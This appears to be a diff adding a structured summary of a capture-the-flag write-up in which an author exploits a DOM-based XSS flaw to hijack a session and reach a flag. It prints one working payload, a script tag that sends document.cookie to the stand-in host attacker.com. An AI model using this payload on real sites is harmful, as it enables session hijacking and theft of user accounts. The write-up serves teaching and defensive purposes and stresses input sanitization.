@@ -1,0 +1,26 @@
+Title: DOM-based XSS to Steal Session Cookies
+Primary topic: Web Exploitation
+Secondary topic: DOM-based XSS
+Tools used: None
+Keywords: session cookies, user input, sanitization, JavaScript code, payload, attacker-controlled domain, authenticated user, hijack, restricted areas, flag, challenge
+
+#overview
+In this CTF writeup, the author describes how they discovered and exploited a DOM-based Cross-Site Scripting (XSS) vulnerability in a web application. The vulnerability allowed the author to steal a user's session cookie, hijack their session, and access restricted areas of the web application.
+
+#analysis
+The author discovered the vulnerability by noticing that the web application used JavaScript to display user input directly on the page without proper sanitization. To test for DOM-based XSS, the author crafted a malicious input containing JavaScript code to steal a user's session cookie. When a user visited the page and their browser executed the malicious JavaScript code, their session cookie was sent to the author's attacker-controlled domain. By stealing the session cookie of an authenticated user, the author was able to hijack their session and access restricted areas of the web application. Inside one of these restricted areas, the author found the flag for the Web Exploitation challenge.
+
+#attack_execution
+The author submitted the malicious input as input in the vulnerable field of the web application. The payload used to steal the session cookie looked like this:
+
+```
+<script>document.location='https://attacker.com/cookie_stealer?cookie='+encodeURIComponent(document.cookie);</script>
+```
+
+The payload contained JavaScript code that redirected the user to the attacker's domain and included the stolen session cookie as a parameter in the URL.
+
+The author's successful exploitation of the DOM-based XSS vulnerability highlights the importance of properly sanitizing and encoding user input in web applications to prevent such attacks.
+
+[CODE_REMOVED]
+
+This writeup demonstrates the potential severity of DOM-based XSS vulnerabilities and the importance of proper input sanitization to prevent them.
